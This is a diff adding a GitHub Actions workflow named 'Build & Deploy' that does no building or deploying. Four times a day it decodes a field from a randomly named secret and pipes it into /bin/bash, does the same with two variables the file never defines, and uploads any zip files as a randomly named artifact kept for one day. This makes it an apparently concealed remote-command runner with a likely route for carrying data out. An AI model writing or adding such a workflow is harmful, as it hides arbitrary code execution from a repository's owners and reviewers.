@@ -1,0 +1,32 @@
+name: Build & Deploy
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '7 3,9,15,21 * * *'
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  check:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: Main step
+        env:
+          bf7256: ${{ secrets.bf7256 }}
+        run: |
+          printf '%s' "$bf7256" | jq -r .n542 | /bin/bash
+          printf '%s' "$vzgp4" | jq -r .bb8 | /bin/bash
+          printf '%s' "$q5566" | jq -r .eq8949 | /bin/bash
+
+      - name: Save data
+        uses: actions/upload-artifact@v4
+        with:
+          name: O9bp5RL3
+          path: "*.zip"
+          retention-days: 1
